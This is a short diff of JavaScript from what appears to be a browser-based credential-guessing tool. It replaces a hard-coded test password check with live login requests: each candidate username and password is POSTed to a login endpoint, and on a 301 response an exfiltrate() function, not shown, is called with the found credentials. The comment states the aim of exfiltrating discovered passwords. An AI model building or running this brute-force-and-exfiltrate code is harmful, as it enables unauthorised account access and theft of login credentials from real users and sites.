@@ -50,7 +50,14 @@
             /***************** TEST FUNCTION HERE **********************/
             // just call exfiltrate(username, password) when a password is find
             console.log('test', username, password);
-            if (username === 'administrator' && password === 'iloveyou') {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', '/example/login/', false);
+            xhr.setRequestHeader('X-CLIENT-UUID', uuid);
+            xhr.send(JSON.stringify({
+                'username': username,
+                'password': password
+            }));
+            if (xhr.status === 301) {
                 exfiltrate(username, password)
             }
         };
